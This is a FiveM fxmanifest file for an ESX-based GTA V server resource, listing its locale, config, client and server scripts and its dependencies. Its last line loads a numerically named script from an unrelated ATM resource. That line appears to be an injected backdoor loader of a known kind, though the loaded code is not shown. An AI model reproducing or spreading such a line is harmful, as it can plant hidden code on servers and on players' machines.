fx_version 'adamant'
game 'gta5'

shared_scripts {
	'@es_extended/locale.lua',
	'locales/es.lua',
	'config.lua',
}

server_scripts {
	'server/main.lua'
}

client_scripts {
	'client/main.lua'
}

dependencies {
	'es_extended',
	'esx_skin',
	--'skincreator',
	'esx_datastore',
	'esx_np_skinshop'
}
client_script '@esx_atm/48706.lua'